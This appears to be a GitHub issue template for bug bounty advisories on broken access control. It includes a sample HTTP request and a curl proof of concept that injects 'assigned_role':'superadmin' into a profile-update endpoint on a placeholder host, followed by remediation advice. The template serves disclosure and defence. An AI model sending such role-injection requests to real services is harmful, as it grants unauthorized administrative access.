---
name: "SOP-04: Broken Access Control & Privilege Escalation (BAC/PRIVESC)"
about: "Rapid reporting template for vertical/horizontal authorization bypasses and administrative boundary flaws."
title: "[BAC] Vertical Privilege Escalation to Admin Role via <Endpoint>"
labels: ["vulnerability-advisory", "broken-access-control", "p1-high"]
assignees: []
---

## 🛡️ Vulnerability Title
**[BAC] Broken Access Control Enables Vertical Privilege Escalation to `[Role]` via `[Vulnerable Endpoint]`**

---

### 1. Executive Summary
A Broken Access Control (BAC) vulnerability was identified in `[Target Program / Subsystem]`. The backend service fails to enforce role-based access control (RBAC) checks on privileged operational endpoints. An unprivileged user can issue administrative requests (or inject privileged role parameters during profile updates) to elevate permissions to `[Administrator/Manager]`, gaining unrestricted access to enterprise data and actions.

---

### 2. Vulnerability & Impact Classification
- **Target Platform:** HackerOne / Bugcrowd / GitHub
- **Asset / URL:** `https://admin.target.com/api/v1/roles/assign`
- **Vulnerability Class:** CWE-284: Improper Access Control
- **CVSS v3.1 Vector:** `CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:H`
- **Base Score:** **8.8 (High)**
- **Severity Tier:** High (P1) / Critical (P0)

---

### 3. Privilege Matrix
| Role | Expected Access | Actual Observed Access |
|---|---|---|
| `standard_member` | View personal profile only | Can update organization settings and invite admins |
| `tenant_admin` | Manage tenant users | Unrestricted across all tenants |

---

### 4. Step-by-Step Reproduction Guide
1. Authenticate with a basic unprivileged user account.
2. Intercept the profile update request or administrative user assignment request:
```http
PUT /api/v1/users/me/role HTTP/1.1
Host: api.target.com
Authorization: Bearer <STANDARD_USER_TOKEN>
Content-Type: application/json

{
  "email": "user@example.com",
  "assigned_role": "superadmin"
}
```
3. Observe that the backend accepts the client-supplied `assigned_role` without verifying that the caller possesses `superadmin` privileges.
4. Verify by accessing restricted endpoint `/api/v1/admin/audit_logs` — request returns `HTTP 200 OK`.

---

### 5. Curl Proof of Concept
```bash
curl -ik -s -X PUT "https://api.target.com/api/v1/users/me/role" \
  -H "Authorization: Bearer <STANDARD_USER_TOKEN>" \
  -H "Content-Type: application/json" \
  -d '{"assigned_role":"superadmin"}'
```

---

### 6. Remediation & Hardening Guidance
1. **Enforce Server-Side Role Immobility:** Prevent mass assignment of role attributes.
2. **Authorize at Every Boundary:** Use declarative middleware or policy-as-code (e.g., OPA / Casbin) verifying explicit role memberships.
